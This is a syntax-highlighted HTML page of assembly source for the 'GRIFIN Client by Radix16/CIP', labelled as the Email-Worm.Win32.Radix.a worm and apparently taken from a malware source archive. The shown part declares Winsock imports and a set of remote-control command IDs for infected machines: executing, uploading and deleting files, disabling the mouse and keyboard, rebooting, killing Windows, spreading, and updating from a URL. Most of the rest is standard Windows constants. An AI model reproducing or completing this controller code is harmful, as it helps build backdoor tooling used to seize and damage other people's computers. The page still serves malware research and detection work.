<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Email-Worm.Win32.Radix.a - client.asm.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc2">.386p</span><span class="sc0">
</span><span class="sc5">locals</span><span class="sc0">
</span><span class="sc5">jumps</span><span class="sc0">
</span><span class="sc9">.Model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc10">STDCALL</span><span class="sc0">

</span><span class="sc1">; GRIFIN Client by Radix16/CIP</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetModuleHandleA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">WSAStartup</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">htons</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">LoadIconA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">LoadCursorA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">DialogBoxParamA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">DefWindowProcA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">EndDialog</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">socket</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">closesocket</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">recv</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetFileSize</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">htons</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CloseHandle</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">WSAStartup</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">ReadFile</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">GetDlgItemTextA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">inet_addr</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">Sleep</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">WSACleanup</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">connect</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">SetDlgItemTextA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">SendDlgItemMessageA</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">
</span><span class="sc9">extrn</span><span class="sc0"> </span><span class="sc5">WSAAsyncSelect</span><span class="sc4">:</span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">useful.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">win32api.inc</span><span class="sc0">

</span><span class="sc5">AF_INET</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">PF_INET</span><span class="sc0">                 </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">SOCK_STREAM</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">1</span><span class="sc0">



</span><span class="sc5">UCHAR</span><span class="sc0">                   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc9">db</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">USHORT</span><span class="sc0">                  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc9">dw</span><span class="sc4">&gt;</span><span class="sc0">  </span><span class="sc1">; used only if we really need 16 bits</span><span class="sc0">
</span><span class="sc5">UINT</span><span class="sc0">                    </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc9">dd</span><span class="sc4">&gt;</span><span class="sc0">  </span><span class="sc1">; 32 bits for WIN32</span><span class="sc0">
</span><span class="sc5">ULONG</span><span class="sc0">                   </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc9">dd</span><span class="sc4">&gt;</span><span class="sc0">


</span><span class="sc5">IDI_ICON1</span><span class="sc0">               </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">100</span><span class="sc0">
</span><span class="sc5">L</span><span class="sc0">                       </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">&lt;</span><span class="sc10">LARGE</span><span class="sc4">&gt;</span><span class="sc0">

</span><span class="sc5">WM_USER</span><span class="sc0">                 </span><span class="sc4">=</span><span class="sc0">   </span><span class="sc2">0400H</span><span class="sc0">
</span><span class="sc5">WM_SOCKET</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc5">WM_USER</span><span class="sc4">+</span><span class="sc2">100</span><span class="sc0">


</span><span class="sc5">ID_OPEN_CD</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">124</span><span class="sc0">
</span><span class="sc5">ID_CLOSE_CD</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">125</span><span class="sc0">
</span><span class="sc5">ID_MSG_BOX</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">126</span><span class="sc0">
</span><span class="sc5">ID_REBOOT_SYSTEM</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">115</span><span class="sc0">
</span><span class="sc5">ID_POWER_OFF</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">110</span><span class="sc0">
</span><span class="sc5">ID_DOWNLOAD_FILE</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">122</span><span class="sc0">
</span><span class="sc5">ID_UPLOAD_FILE</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">123</span><span class="sc0">
</span><span class="sc5">ID_DELETE_FILE</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">113</span><span class="sc0">
</span><span class="sc5">ID_EXECUTE_FILE</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">119</span><span class="sc0">
</span><span class="sc5">ID_COPY_FILE</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">121</span><span class="sc0">
</span><span class="sc5">ID_MOVE_FILE</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">120</span><span class="sc0">
</span><span class="sc5">ID_MOUSE_OFF</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">109</span><span class="sc0">
</span><span class="sc5">ID_KEYBOARD_OFF</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">118</span><span class="sc0">
</span><span class="sc5">ID_KILL_WINDOWS</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">112</span><span class="sc0">

</span><span class="sc5">ID_CMD_1</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">104</span><span class="sc0">
</span><span class="sc5">ID_CMD_2</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">106</span><span class="sc0">


</span><span class="sc5">ID_CONNECT</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">101</span><span class="sc0">
</span><span class="sc5">ID_IP</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">102</span><span class="sc0">
</span><span class="sc5">ID_EXIT</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">103</span><span class="sc0">


</span><span class="sc5">ID_IRC</span><span class="sc0">          </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">111</span><span class="sc0">
</span><span class="sc5">ID_IRC_CANCEL</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">523</span><span class="sc0">
</span><span class="sc5">ID_IRC_CONNECT</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">524</span><span class="sc0">


</span><span class="sc5">ID_SPREAD</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">117</span><span class="sc0">
</span><span class="sc5">ID_SPREAD_CANCEL</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">790</span><span class="sc0">
</span><span class="sc5">ID_SPREAD_SEND</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">789</span><span class="sc0">


</span><span class="sc5">ID_UPDATE</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">116</span><span class="sc0">
</span><span class="sc5">ID_UPDATE_URL</span><span class="sc0">       </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">102</span><span class="sc0">
</span><span class="sc5">ID_UPDATE_CANCEL</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">
</span><span class="sc5">ID_UPDATE_GO</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">513</span><span class="sc0">


</span><span class="sc5">ID_CHAT</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">127</span><span class="sc0">
</span><span class="sc5">ID_CHAT_CANCEL</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">555</span><span class="sc0">
</span><span class="sc5">ID_CHAT_SEND</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">456</span><span class="sc0">
</span><span class="sc5">ID_CHAT_TAB</span><span class="sc0">     </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1234</span><span class="sc0">
</span><span class="sc5">ID_CHAT_TEXT</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1235</span><span class="sc0">

</span><span class="sc5">IDD_TAB</span><span class="sc0">         </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">108</span><span class="sc0">

</span><span class="sc5">FD_READ</span><span class="sc0">             </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">001h</span><span class="sc0">
</span><span class="sc5">FD_WRITE</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">002h</span><span class="sc0">
</span><span class="sc5">FD_OOB</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">004h</span><span class="sc0">
</span><span class="sc5">FD_ACCEPT</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">008h</span><span class="sc0">
</span><span class="sc5">FD_CONNECT</span><span class="sc0">              </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">010h</span><span class="sc0">
</span><span class="sc5">FD_CLOSE</span><span class="sc0">            </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc2">020h</span><span class="sc0">

</span><span class="sc1">; Class styles</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">CS_VREDRAW</span><span class="sc0">              </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0001h</span><span class="sc0">
</span><span class="sc5">CS_HREDRAW</span><span class="sc0">              </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0002h</span><span class="sc0">
</span><span class="sc5">CS_KEYCVTWINDOW</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0004H</span><span class="sc0">
</span><span class="sc5">CS_DBLCLKS</span><span class="sc0">              </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0008h</span><span class="sc0">
</span><span class="sc5">SBS_SIZEGRIP</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0010h</span><span class="sc0">
</span><span class="sc5">CS_OWNDC</span><span class="sc0">                </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0020h</span><span class="sc0">
</span><span class="sc5">CS_CLASSDC</span><span class="sc0">              </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0040h</span><span class="sc0">
</span><span class="sc5">CS_PARENTDC</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0080h</span><span class="sc0">
</span><span class="sc5">CS_NOKEYCVT</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0100h</span><span class="sc0">
</span><span class="sc5">CS_SAVEBITS</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0800h</span><span class="sc0">
</span><span class="sc5">CS_NOCLOSE</span><span class="sc0">              </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0200h</span><span class="sc0">
</span><span class="sc5">CS_BYTEALIGNCLIENT</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">1000h</span><span class="sc0">
</span><span class="sc5">CS_BYTEALIGNWINDOW</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">2000h</span><span class="sc0">
</span><span class="sc5">CS_GLOBALCLASS</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">4000h</span><span class="sc0">    </span><span class="sc1">; Global window class</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Predefined cursor &amp; icon IDs</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc5">IDC_ARROW</span><span class="sc0">               </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">32512</span><span class="sc0">
</span><span class="sc5">IDC_IBEAM</span><span class="sc0">               </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">32513</span><span class="sc0">
</span><span class="sc5">IDC_WAIT</span><span class="sc0">                </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">32514</span><span class="sc0">
</span><span class="sc5">IDC_CROSS</span><span class="sc0">               </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">32515</span><span class="sc0">
</span><span class="sc5">IDC_UPARROW</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">32516</span><span class="sc0">
</span><span class="sc5">IDC_SIZE</span><span class="sc0">                </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">32640</span><span class="sc0">
</span><span class="sc5">IDC_ICON</span><span class="sc0">                </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">32641</span><span class="sc0">
</span><span class="sc5">IDC_SIZENWSE</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">32642</span><span class="sc0">
</span><span class="sc5">IDC_SIZENESW</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">32643</span><span class="sc0">
</span><span class="sc5">IDC_SIZEWE</span><span class="sc0">              </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">32644</span><span class="sc0">
</span><span class="sc5">IDC_SIZENS</span><span class="sc0">              </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">32645</span><span class="sc0">


</span><span class="sc5">WM_NULL</span><span class="sc0">                 </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">WM_CREATE</span><span class="sc0">               </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0001h</span><span class="sc0">
</span><span class="sc5">WM_DESTROY</span><span class="sc0">              </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0002h</span><span class="sc0">
</span><span class="sc5">WM_MOVE</span><span class="sc0">                 </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0003h</span><span class="sc0">
</span><span class="sc5">WM_SIZE</span><span class="sc0">                 </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0005h</span><span class="sc0">
</span><span class="sc5">WM_ACTIVATE</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0006h</span><span class="sc0">
</span><span class="sc5">WM_SETFOCUS</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0007h</span><span class="sc0">
</span><span class="sc5">WM_KILLFOCUS</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0008h</span><span class="sc0">
</span><span class="sc5">WM_ENABLE</span><span class="sc0">               </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">000Ah</span><span class="sc0">
</span><span class="sc5">WM_SETREDRAW</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">000Bh</span><span class="sc0">
</span><span class="sc5">WM_SETTEXT</span><span class="sc0">              </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">000Ch</span><span class="sc0">
</span><span class="sc5">WM_GETTEXT</span><span class="sc0">              </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">000Dh</span><span class="sc0">
</span><span class="sc5">WM_GETTEXTLENGTH</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">000Eh</span><span class="sc0">
</span><span class="sc5">WM_PAINT</span><span class="sc0">                </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">000Fh</span><span class="sc0">
</span><span class="sc5">WM_CLOSE</span><span class="sc0">                </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0010h</span><span class="sc0">
</span><span class="sc5">WM_QUERYENDSESSION</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0011h</span><span class="sc0">
</span><span class="sc5">WM_QUIT</span><span class="sc0">                 </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0012h</span><span class="sc0">
</span><span class="sc5">WM_QUERYOPEN</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0013h</span><span class="sc0">
</span><span class="sc5">WM_ERASEBKGND</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0014h</span><span class="sc0">
</span><span class="sc5">WM_SYSCOLORCHANGE</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0015h</span><span class="sc0">
</span><span class="sc5">WM_ENDSESSION</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0016h</span><span class="sc0">
</span><span class="sc5">WM_SYSTEMERROR</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0017h</span><span class="sc0">
</span><span class="sc5">WM_SHOWWINDOW</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0018h</span><span class="sc0">

</span><span class="sc5">WM_INITDIALOG</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0110h</span><span class="sc0">
</span><span class="sc5">WM_COMMAND</span><span class="sc0">              </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0111h</span><span class="sc0">
</span><span class="sc5">WM_SYSCOMMAND</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0112h</span><span class="sc0">
</span><span class="sc5">WM_TIMER</span><span class="sc0">                </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0113h</span><span class="sc0">
</span><span class="sc5">WM_HSCROLL</span><span class="sc0">              </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0114h</span><span class="sc0">
</span><span class="sc5">WM_VSCROLL</span><span class="sc0">              </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0115h</span><span class="sc0">
</span><span class="sc5">WM_INITMENU</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0116h</span><span class="sc0">
</span><span class="sc5">WM_INITMENUPOPUP</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0117h</span><span class="sc0">
</span><span class="sc5">WM_MENUSELECT</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">011Fh</span><span class="sc0">
</span><span class="sc5">WM_MENUCHAR</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0120h</span><span class="sc0">
</span><span class="sc5">WM_ENTERIDLE</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0121h</span><span class="sc0">

</span><span class="sc1">; ShowWindow() Commands</span><span class="sc0">
</span><span class="sc5">SW_HIDE</span><span class="sc0">                 </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SW_SHOWNORMAL</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">SW_NORMAL</span><span class="sc0">               </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc5">SW_SHOWMINIMIZED</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">2</span><span class="sc0">
</span><span class="sc5">SW_SHOWMAXIMIZED</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">SW_MAXIMIZE</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">3</span><span class="sc0">
</span><span class="sc5">SW_SHOWNOACTIVATE</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">SW_SHOW</span><span class="sc0">                 </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">SW_MINIMIZE</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">SW_SHOWMINNOACTIVE</span><span class="sc0">      </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">7</span><span class="sc0">
</span><span class="sc5">SW_SHOWNA</span><span class="sc0">               </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">8</span><span class="sc0">
</span><span class="sc5">SW_RESTORE</span><span class="sc0">              </span><span class="sc4">=</span><span class="sc0">       </span><span class="sc2">9</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Edit Control Messages</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">EM_GETSEL</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00B0h</span><span class="sc0">
</span><span class="sc5">EM_SETSEL</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00B1h</span><span class="sc0">
</span><span class="sc5">EM_GETRECT</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00B2h</span><span class="sc0">
</span><span class="sc5">EM_SETRECT</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00B3h</span><span class="sc0">
</span><span class="sc5">EM_SETRECTNP</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00B4h</span><span class="sc0">
</span><span class="sc5">EM_SCROLL</span><span class="sc0">             </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00B5h</span><span class="sc0">
</span><span class="sc5">EM_LINESCROLL</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00B6h</span><span class="sc0">
</span><span class="sc5">EM_SCROLLCARET</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00B7h</span><span class="sc0">
</span><span class="sc5">EM_GETMODIFY</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00B8h</span><span class="sc0">
</span><span class="sc5">EM_SETMODIFY</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00B9h</span><span class="sc0">
</span><span class="sc5">EM_GETLINECOUNT</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00BAh</span><span class="sc0">
</span><span class="sc5">EM_LINEINDEX</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00BBh</span><span class="sc0">
</span><span class="sc5">EM_SETHANDLE</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00BCh</span><span class="sc0">
</span><span class="sc5">EM_GETHANDLE</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00BDh</span><span class="sc0">
</span><span class="sc5">EM_GETTHUMB</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00BEh</span><span class="sc0">
</span><span class="sc5">EM_LINELENGTH</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00C1h</span><span class="sc0">
</span><span class="sc5">EM_REPLACESEL</span><span class="sc0">         </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00C2h</span><span class="sc0">
</span><span class="sc5">EM_GETLINE</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00C4h</span><span class="sc0">
</span><span class="sc5">EM_LIMITTEXT</span><span class="sc0">          </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00C5h</span><span class="sc0">
</span><span class="sc5">EM_CANUNDO</span><span class="sc0">            </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00C6h</span><span class="sc0">
</span><span class="sc5">EM_UNDO</span><span class="sc0">               </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00C7h</span><span class="sc0">
</span><span class="sc5">EM_FMTLINES</span><span class="sc0">           </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00C8h</span><span class="sc0">
</span><span class="sc5">EM_LINEFROMCHAR</span><span class="sc0">       </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00C9h</span><span class="sc0">
</span><span class="sc5">EM_SETTABSTOPS</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00CBh</span><span class="sc0">
</span><span class="sc5">EM_SETPASSWORDCHAR</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00CCh</span><span class="sc0">
</span><span class="sc5">EM_EMPTYUNDOBUFFER</span><span class="sc0">    </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00CDh</span><span class="sc0">
</span><span class="sc5">EM_GETFIRSTVISIBLELINE</span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00CEh</span><span class="sc0">
</span><span class="sc5">EM_SETREADONLY</span><span class="sc0">        </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00CFh</span><span class="sc0">
</span><span class="sc5">EM_SETWORDBREAKPROC</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00D0h</span><span class="sc0">
</span><span class="sc5">EM_GETWORDBREAKPROC</span><span class="sc0">   </span><span class="sc4">=</span><span class="sc0">  </span><span class="sc2">00D1h</span><span class="sc0">
